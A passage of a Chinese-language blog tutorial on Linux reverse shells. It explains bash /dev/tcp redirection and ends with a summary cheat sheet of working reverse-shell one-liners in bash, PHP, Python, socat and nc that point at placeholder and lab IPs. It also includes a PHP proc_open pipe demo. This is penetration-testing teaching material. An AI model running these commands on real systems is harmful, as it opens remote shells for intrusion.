title="首先2&gt;&amp;1在执行的时候是把进程的标准错误2定向到了标准输出1对应的目标，这个目标此时是进程执行的终端。"></a>首先<code>2&gt;&amp;1</code>在执行的时候是把进程的标准错误<code>2</code>定向到了标准输出<code>1</code>对应的目标，这个目标此时是进程执行的<code>终端</code>。</h6><h6 id="当解析到-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f，而此时标准错误2还是指向前一步中定向的终端，因此造成了执行的问题。"><a href="#当解析到-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f，而此时标准错误2还是指向前一步中定向的终端，因此造成了执行的问题。" class="headerlink" title="当解析到&gt; /tmp/f的时候进程会把标准输出1定向到FIFO文件/tmp/f，而此时标准错误2还是指向前一步中定向的终端，因此造成了执行的问题。"></a>当解析到<code>&gt; /tmp/f</code>的时候进程会把标准输出<code>1</code>定向到FIFO文件<code>/tmp/f</code>，而此时标准错误<code>2</code>还是指向前一步中定向的<code>终端</code>，因此造成了执行的问题。</h6><h6 id="通常的bash一句话"><a href="#通常的bash一句话" class="headerlink" title="通常的bash一句话"></a>通常的bash一句话</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.220.153/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h6 id="bash反弹一句话的拆分"><a href="#bash反弹一句话的拆分" class="headerlink" title="bash反弹一句话的拆分"></a>bash反弹一句话的拆分</h6><table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th align="left">命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">bash -i</td>
+<td align="left">产生一个bash交互环境</td>
+</tr>
+<tr>
+<td align="left">&gt;&amp;</td>
+<td align="left">将联合符号前面的内容与后面相结合然后一起重定向给后者</td>
+</tr>
+<tr>
+<td align="left">/dev/tcp/192.168.220.153/8080</td>
+<td align="left">linux环境中所有的内容都是以文件的形式存在的，其实这个就是让主机与目标主机<code>192.168.220.153:8080</code>端口建立一个<code>TCP连接</code></td>
+</tr>
+<tr>
+<td align="left">0&gt;&amp;1</td>
+<td align="left">将<code>标准的输入</code>与<code>标准输出</code>内容相结合，然后重定向给前面<code>标准的输出</code>内容。</td>
+</tr>
+</tbody></table>
+<h6 id="bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP-8080-会话连接）相结合，然后在重定向个tcp-8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash-反弹环境。"><a href="#bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP-8080-会话连接）相结合，然后在重定向个tcp-8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash-反弹环境。" class="headerlink" title="bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。"></a>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</h6><h6 id="php脚本反弹："><a href="#php脚本反弹：" class="headerlink" title="php脚本反弹："></a>php脚本反弹：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.118.138&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="socat反弹一句话"><a href="#socat反弹一句话" class="headerlink" title="socat反弹一句话"></a>socat反弹一句话</h5><h6 id="Socat是Linux-下一个多功能的网络工具，名字来由是”-Socket-CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情-，其功能与netcat类似，不过据说可以看做netcat的加强版-事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。"><a href="#Socat是Linux-下一个多功能的网络工具，名字来由是”-Socket-CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情-，其功能与netcat类似，不过据说可以看做netcat的加强版-事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。" class="headerlink" title="Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。"></a>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</h6><h6 id="有关socat二进制可执行文件，大家可以到这个链接下载：https-github-com-andrew-d-static-binaries-raw-master-binaries-linux-x86-64-socat"><a href="#有关socat二进制可执行文件，大家可以到这个链接下载：https-github-com-andrew-d-static-binaries-raw-master-binaries-linux-x86-64-socat" class="headerlink" title="有关socat二进制可执行文件，大家可以到这个链接下载：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"></a>有关socat二进制可执行文件，大家可以到这个链接下载：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a></h6><h5 id="kali中"><a href="#kali中" class="headerlink" title="kali中"></a>kali中</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:8080 -</span><br></pre></td></tr></table></figure>
+
+<h6 id="另一台靶机运行socat反弹shell"><a href="#另一台靶机运行socat反弹shell" class="headerlink" title="另一台靶机运行socat反弹shell"></a>另一台靶机运行socat反弹shell</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:192.168.220.153:8080</span><br></pre></td></tr></table></figure>
+
+<h6 id="python脚本反弹"><a href="#python脚本反弹" class="headerlink" title="python脚本反弹"></a>python脚本反弹</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.138",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="0x03-proc-open双管道，多线程执行命令"><a href="#0x03-proc-open双管道，多线程执行命令" class="headerlink" title="0x03 proc_open双管道，多线程执行命令"></a>0x03 proc_open双管道，多线程执行命令</h5><h6 id="采用cli的方式运行PHP脚本"><a href="#采用cli的方式运行PHP脚本" class="headerlink" title="采用cli的方式运行PHP脚本"></a>采用cli的方式运行PHP脚本</h6><h6 id="STDIN：读取脚本的输入字符"><a href="#STDIN：读取脚本的输入字符" class="headerlink" title="STDIN：读取脚本的输入字符"></a>STDIN：读取脚本的输入字符</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input a string: "</span>;</span><br><span class="line">$stdin=fread(STDIN,<span class="number">65535</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you have input:$stdin"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。"><a href="#从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。" class="headerlink" title="从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。"></a>从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。</h6><h5 id="PHP开启一个子进程"><a href="#PHP开启一个子进程" class="headerlink" title="PHP开启一个子进程"></a>PHP开启一个子进程</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$child_file = <span class="string">"proc.php"</span>;</span><br><span class="line"></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// 输入，子进程从此管道中读取数据</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// 输出，子进程输出</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"error-output.txt"</span>, <span class="string">"a"</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line">$child_process = proc_open(<span class="string">"php &#123;$child_file&#125;"</span>, $descriptorspec, $pipes);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input:"</span>;</span><br><span class="line"></span><br><span class="line">$stdin=fread(STDIN,<span class="number">65535</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you hanve input $stdin"</span>;</span><br><span class="line">fwrite($pipes[<span class="number">0</span>], $stdin);</span><br><span class="line"></span><br><span class="line">$stdout=fread($pipes[<span class="number">1</span>],<span class="number">65535</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"parent recieve : $stdout"</span>;</span><br><span class="line"></span><br><span class="line">proc_close($child_process);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="proc-php"><a href="#proc-php" class="headerlink" title="proc.php"></a>proc.php</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$stdin = fread(STDIN, <span class="number">65535</span>);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"parent process transmit:"</span> . $stdin;</span><br></pre></td></tr></table></figure>
+
+<h6 id="运行index-php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下："><a href="#运行index-php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下：" class="headerlink" title="运行index.php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下："></a>运行index.php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/php_file# php index.php</span><br><span class="line">please input: hello</span><br><span class="line">you hanve input hello</span><br><span class="line">parent recieve : parent process transmit: hello</span><br></pre></td></tr></table></figure>
+
+<h5 id="proc-open-file-descriptorspec-pipes"><a href="#proc-open-file-descriptorspec-pipes" class="headerlink" title="proc_open($file,$descriptorspec,$pipes)"></a>proc_open($file,$descriptorspec,$pipes)</h5><h6 id="开启一个子进程。"><a href="#开启一个子进程。" class="headerlink" title="开启一个子进程。"></a>开启一个子进程。</h6><h6 id="file-子进程要打开的脚本"><a href="#file-子进程要打开的脚本" class="headerlink" title="$file:子进程要打开的脚本"></a>$file:子进程要打开的脚本</h6><h6 id="descriptorspec-输入输出读取的配置文件，数组"><a href="#descriptorspec-输入输出读取的配置文件，数组" class="headerlink" title="$descriptorspec: 输入输出读取的配置文件，数组"></a>$descriptorspec: 输入输出读取的配置文件，数组</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$descriptorspec=<span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt;input,  </span><br><span class="line"><span class="comment">// input= array("pipe", "r")则主进程从 $pipes[0]写入数据，子进程从STDIN中读取$pipes[0]中的数据</span></span><br><span class="line"><span class="comment">//input=STDIN  则子进程从主进程的STDIN中读取数据</span></span><br><span class="line">输入，子进程从此管道中读取数据</span><br><span class="line">    <span class="number">1</span> =&gt;output,  </span><br><span class="line"><span class="comment">//output= array("pipe", "w")  主进程echo/print_r的内容输出到$pipes[1]中，主进程从$pipes[1]中取数据</span></span><br><span class="line"><span class="comment">//output=STDOUT 子进程输出的数据，直接输出的到父进程的STDOUT中</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"error-output.txt"</span>, <span class="string">"a"</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h5 id="反弹shell命令总结"><a href="#反弹shell命令总结" class="headerlink" title="反弹shell命令总结"></a>反弹shell命令总结</h5><h6 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;attackerIP&gt;/[port] 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.118.138/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h6 id="注意这个是由解析shell的bash完成，所以某些情况下不支持"><a href="#注意这个是由解析shell的bash完成，所以某些情况下不支持" class="headerlink" title="注意这个是由解析shell的bash完成，所以某些情况下不支持"></a>注意这个是由解析shell的bash完成，所以某些情况下不支持</h6><h6 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><h6 id="Linux-nc命令与反弹shell"><a href="#Linux-nc命令与反弹shell" class="headerlink" title="Linux nc命令与反弹shell"></a><a href="https://v0w.top/2018/08/12/nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&%E5%8F%8D%E5%BC%B9shell/#socat%E5%8F%8D%E5%BC%B9%E4%B8%80%E5%8F%A5%E8%AF%9D" target="_blank" rel="noopener">Linux nc命令与反弹shell</a></h6><h6 id="linux各种一句话反弹shell总结"><a href="#linux各种一句话反弹shell总结" class="headerlink" title="linux各种一句话反弹shell总结"></a><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">linux各种一句话反弹shell总结</a></h6><h6 id="各种环境下反弹-shell-的方法"><a href="#各种环境下反弹-shell-的方法" class="headerlink" title="各种环境下反弹 shell 的方法"></a><a href="http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">各种环境下反弹 shell 的方法</a></h6><h6 id="渗透测试-反弹与转发小结"><a href="#渗透测试-反弹与转发小结" class="headerlink" title="渗透测试:反弹与转发小结"></a><a href="https://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="noopener">渗透测试:反弹与转发小结</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/13/2019湘湖杯的web题解/" rel="next" title="2019湘湖杯的web题解">
+                <i class="fa fa-chevron-left"></i> 2019湘湖杯的web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-linux-nc命令与反弹shell"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 linux nc命令与反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#linux中nc命令是一个功能强大的网络工具，全称是netcat。"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">linux中nc命令是一个功能强大的网络工具，全称是netcat。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nc-netcat-选项-参数"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">nc/netcat(选项)(参数)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#选项"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">选项</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参数："><span class="nav-number">1.0.1.4.</span> <span class="nav-text">参数：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TCP端口扫描"><span class="nav-number">1.0.2.</span> <span class="nav-text">TCP端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UDP端口扫描"><span class="nav-number">1.0.3.</span> <span class="nav-text">UDP端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用netcat实现局域网聊天"><span class="nav-number">1.0.4.</span> <span class="nav-text">使用netcat实现局域网聊天</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用netcat实现文件传输"><span class="nav-number">1.0.5.</span> <span class="nav-text">使用netcat实现文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听："><span class="nav-number">1.0.5.1.</span> <span class="nav-text">和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#发送端进行发送："><span class="nav-number">1.0.5.2.</span> <span class="nav-text">发送端进行发送：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不过传输完之后不会自动断开连接得手动ctrl-c断开，而且转输完成并没有什么标志不知是否已传完。"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">不过传输完之后不会自动断开连接得手动ctrl+c断开，而且转输完成并没有什么标志不知是否已传完。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-什么是反弹shell？"><span class="nav-number">1.0.6.</span> <span class="nav-text">0x01 什么是反弹shell？</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆-比如ssh-telnet-从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell-也叫reverse-shell-就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆(比如ssh/telnet)从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell(也叫reverse shell)就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#建立反弹shell"><span class="nav-number">1.0.7.</span> <span class="nav-text">建立反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#建立本地server"><span class="nav-number">1.0.8.</span> <span class="nav-text">建立本地server</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#使用nc在本地建立server进行网络连接监听，本例子监听在8080端口上。"><span class="nav-number">1.0.8.1.</span> <span class="nav-text">使用nc在本地建立server进行网络连接监听，本例子监听在8080端口上。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nc-lvp-8080"><span class="nav-number">1.0.8.2.</span> <span class="nav-text">$ nc -lvp 8080</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#建立远程client"><span class="nav-number">1.0.9.</span> <span class="nav-text">建立远程client</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#方法一：在远程被控机上用nc建立client进行连接。"><span class="nav-number">1.0.9.1.</span> <span class="nav-text">方法一：在远程被控机上用nc建立client进行连接。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-mkfifo-pipe创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。"><span class="nav-number">1.0.9.2.</span> <span class="nav-text">1. mkfifo pipe创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-cat-pipe读取有名管道中的内容，读取的内容通过管道-写入bash。"><span class="nav-number">1.0.9.3.</span> <span class="nav-text">2. cat pipe读取有名管道中的内容，读取的内容通过管道|写入bash。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-bash-i-2-gt-amp-1建立交互式shell，并把标准错误合并到标准输出，然后通过管道-发给nc客户端。"><span class="nav-number">1.0.9.4.</span> <span class="nav-text">3. bash -i 2&gt;&amp;1建立交互式shell，并把标准错误合并到标准输出，然后通过管道|发给nc客户端。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-nc-8080-gt-pipe向server发起连接，并把从server端接收到的内容写入pipe，注意，这些写到pipe的内容又被上面步骤的2读出来写给shell。"><span class="nav-number">1.0.9.5.</span> <span class="nav-text">4. nc 8080 &gt;pipe向server发起连接，并把从server端接收到的内容写入pipe，注意，这些写到pipe的内容又被上面步骤的2读出来写给shell。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#感觉有点绕，我们在来回顾一下。"><span class="nav-number">1.0.9.6.</span> <span class="nav-text">感觉有点绕，我们在来回顾一下。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前面的那一串命令建立了一个连接，该连接通过nc与server端进行连接，server端的输入会被发送到client端的nc并写入pipe，之后被cat读出来发给shell执行。shell的执行输出通过nc发给server。连接的图示如下："><span class="nav-number">1.0.9.7.</span> <span class="nav-text">前面的那一串命令建立了一个连接，该连接通过nc与server端进行连接，server端的输入会被发送到client端的nc并写入pipe，之后被cat读出来发给shell执行。shell的执行输出通过nc发给server。连接的图示如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法2：在远程机上用建立连接。"><span class="nav-number">1.0.9.8.</span> <span class="nav-text">方法2：在远程机上用建立连接。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#前面的方法1中不太简洁的地方是用了cat，那么我们可以简化一下："><span class="nav-number">1.0.9.9.</span> <span class="nav-text">前面的方法1中不太简洁的地方是用了cat，那么我们可以简化一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#建立方法的命令如下："><span class="nav-number">1.0.9.10.</span> <span class="nav-text">建立方法的命令如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法3："><span class="nav-number">1.0.9.11.</span> <span class="nav-text">方法3：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。"><span class="nav-number">1.0.9.12.</span> <span class="nav-text">了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#建立连接方法如下："><span class="nav-number">1.0.9.13.</span> <span class="nav-text">建立连接方法如下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他话题"><span class="nav-number">1.0.10.</span> <span class="nav-text">其他话题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-啥是FIFO？"><span class="nav-number">1.0.10.1.</span> <span class="nav-text">1. 啥是FIFO？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 